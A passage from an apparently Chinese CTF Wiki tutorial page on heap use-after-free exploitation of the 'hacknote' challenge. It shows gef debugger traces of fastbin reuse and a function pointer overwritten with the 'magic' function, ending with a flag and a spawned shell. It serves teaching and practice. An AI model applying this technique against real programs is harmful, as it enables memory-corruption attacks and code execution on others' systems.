8
0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp  ← $esp
</pre></div>
</div>
<p>当delete结束后，我们观看一下bins，可以发现，确实其被存放在对应的fast bin中，</p>
<div class="code cpp highlight-default"><div class="highlight"><pre><span></span>gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10)
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28)
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00
</pre></div>
</div>
<p>当我们将note1也全部删除完毕后，再次观看bins。可以看出，后删除的chunk块确实处于表头。</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10)
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28)
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00
</pre></div>
</div>
<p>那么，此时即将要申请note2，我们可以看下note2都申请到了什么内存块，如下</p>
<p><strong>申请note2对应的内存块为0x804b040，其实就是note1对应的内存地址。</strong></p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
0x080486cf in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b040  →  0x0804b000  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax
    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;
 →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10
</pre></div>
</div>
<p><strong>申请note2的content的内存地址为0x804b008，就是note0对应的地址，即此时我们向note2的content写内容，就会将note0的put字段覆盖。</strong></p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  n 1
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
0x08048761 in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x0804b040  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804
    0x8048757 &lt;add_note+225&gt;   call   0x581173df
    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;
 →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10
</pre></div>
</div>
<p>我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的put指针已经被置为NULL了，这是由fastbin的free机制决定的。</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  x/2xw 0x804b008
0x804b008:  0x00000000  0x0804b018
</pre></div>
</div>
<p>覆盖后，具体的值如下</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  x/2xw 0x804b008
0x804b008:  0x08048986  0x0804b00a
gef➤  x/i 0x08048986
   0x8048986 &lt;magic&gt;:   push   ebp
</pre></div>
</div>
<p>可以看出，确实已经被覆盖为我们所想要的magic函数了。</p>
<p>最后执行的效果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="s1">&#39;./hacknote&#39;</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">35030</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="n">flag</span><span class="p">{</span><span class="n">use_after_free</span><span class="p">}</span><span class="o">----------------------</span>
       <span class="n">HackNote</span>
<span class="o">----------------------</span>
 <span class="mf">1.</span> <span class="n">Add</span> <span class="n">note</span>
 <span class="mf">2.</span> <span class="n">Delete</span> <span class="n">note</span>
 <span class="mf">3.</span> <span class="n">Print</span> <span class="n">note</span>
 <span class="mf">4.</span> <span class="n">Exit</span>
<span class="o">----------------------</span>
</pre></div>
</div>
<p>同时，我们还可以借助gef的heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  heap-analysis-helper
[*] This feature is under development, expect bugs and unstability...
[+] Tracking malloc()
[+] Tracking free()
[+] Tracking realloc()
[+] Disabling hardware watchpoints (this may increase the latency)
[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.
[*] Note: The heap analysis slows down noticeably the execution.
gef➤  c
Continuing.
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(32)=0x804b018
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(32)=0x804b050
[+] Heap-Analysis - free(0x804b018)
[+] Heap-Analysis - watching 0x804b018
[+] Heap-Analysis - free(0x804b008)
[+] Heap-Analysis - watching 0x804b008
[+] Heap-Analysis - free(0x804b050)
[+] Heap-Analysis - watching 0x804b050
[+] Heap-Analysis - free(0x804b040)
[+] Heap-Analysis - watching 0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - Cleaning up
[+] Heap-Analysis - Re-enabling hardware watchpoints
[New process 36248]
process 36248 is executing new program: /bin/dash
[New process 36249]
process 36249 is executing new program: /bin/cat
[Inferior 3 (process 36249) exited normally]
</pre></div>
</div>
<p>这里第一个输出了两次，应该是gef工具的问题。</p>
</div>
</div>
<div class="section" id="id6">
<h2>题目<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h2>
<ul class="simple">
<li>2016 HCTF fheap</li>
</ul>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
<div id="searchbox" style="display: none" role="search">
  <h3>快速搜索</h3>
    <form class="search" action="../../search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="转向" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
<div class="sphinx-toc sphinxglobaltoc">
<h3><a href="../../index.html">內容目录</a></h3>
<p class="caption"><span class="caption-text">CTF 介绍</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/history.html">CTF 竞赛的历史</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/mode.html">CTF 竞赛模式简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/content.html">CTF 竞赛内容</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/experience.html">线下攻防经验小结</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/cgc.html">CGC 网络超级挑战赛</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/resources.html">学习资源</a></li>
</ul>
<p class="caption"><span class="caption-text">Misc</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../misc/about.html">杂项简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/recon.html">信息搜集技术</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/encode/index.html">编码分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/prefix.html">取证隐写</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/picture/index.html">图片分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/traffic/index.html">流量包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/archive/index.html">压缩包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/audio/index.html">音频分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/disk_memory/index.html">磁盘 / 内存分析</a></li>
</ul>
<p class="caption"><span class="caption-text">Crypto</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/introduction.html">密码学简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/classical/index.html">古典密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/symmetric/index.html">对称加密</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/asymmetric/index.html">非对称密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/hash/index.html">哈希函数</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/signature/index.html">数字签名</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/others/others.html">证书格式</a></li>
</ul>
<p class="caption"><span class="caption-text">Web</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../web/index.html">WEB 简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/sqli.html">SQL 注入</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/xss.html">XSS 跨站脚本攻击</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/csrf.html">CSRF 跨站请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/ssrf.html">SSRF 服务端请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/php.html">PHP 代码审计</a></li>
</ul>
<p class="caption"><span class="caption-text">Reverse</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/introduction.html">软件逆向工程简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unpack/index.html">Unpack Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unicorn/index.html">Unicorn Engine</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/anti_debug/index.html">Anti Debug Tech</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/linux/index.html">Linux RE</a></li>
</ul>
<p class="caption"><span class="caption-text">Pwn</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../stackoverflow/index.html">栈溢出</a></li>
<li class="toctree-l1"><a class="reference internal" href="../fmtstr/index.html">格式化字符串漏洞</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="index.html">堆利用</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="heap_overview.html">堆概述</a></li>
<li class="toctree-l2"><a class="reference internal" href="heap_structure.html">堆相关数据结构</a></li>
<li class="toctree-l2"><a class="reference internal" href="heap_implementation_details.html">深入理解堆的实现</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow_basic.html">堆溢出</a></li>
<li class="toctree-l2"><a class="reference internal" href="off_by_one.html">堆中的 Off-By-One</a></li>
<li class="toctree-l2"><a class="reference internal" href="unlink.html">Unlink</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">Use After Free</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id1">原理</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id2">例子</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id3">功能分析</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#add-note">add_note</a></li>
<li class="toctree-l5"><a class="reference internal" href="#print-note">print_note</a></li>
<li class="toctree-l5"><a class="reference internal" href="#delete-note">delete_note</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#id4">利用分析</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id5">利用脚本</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id6">题目</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="fastbin_attack.html">Fastbin Attack</a></li>
<li class="toctree-l2"><a class="reference internal" href="chunk_extend_shrink.html">Chunk Extend/Shrink</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_einherjar.html">House Of Einherjar</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_lore.html">House of Lore</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_force.html">House Of Force</a></li>
<li class="toctree-l2"><a class="reference internal" href="unsorted_bin_attack.html">Unsorted Bin Attack</a></li>
</ul>
</li>
</ul>
<p class="caption"><span class="caption-text">Executable</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../executable/elf/index.html">ELF文件</a></li>
</ul>
</div>
        </div>
      </div>
    
    
        <div class="sidebar-toggle-group no-js">
            
            <button class="sidebar-toggle" id="sidebar-hide" title="Hide the sidebar menu">
                 «
                <span class="show-for-small">hide menu</span>
                
            </button>
            <button class="sidebar-toggle" id="sidebar-show" title="Show the sidebar menu">
                
                <span class="show-for-small">menu</span>
                <span class="hide-for-small">sidebar</span>
                 »
            </button>
        </div>
    
      <div class="clearer"></div>
    </div>
    <div class="relbar-bottom">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             >toc</a></li>
        <li class="right" >
          <a href="fastbin_attack.html" title="Fastbin Attack"
             >下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="unlink.html" title="Unlink"
             >上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" >堆利用</a> &#187;</li> 
      </ul>
    </div>
    </div>

    <div class="footer" role="contentinfo">
        &#169; Copyright 2016-2017, CTF Wiki.
      由 <a href="http://sphinx-doc.org/">Sphinx</a> 1.6.7 创建。
    </div>
    <!-- cloud_sptheme 1.4 -->
  </body>
</html>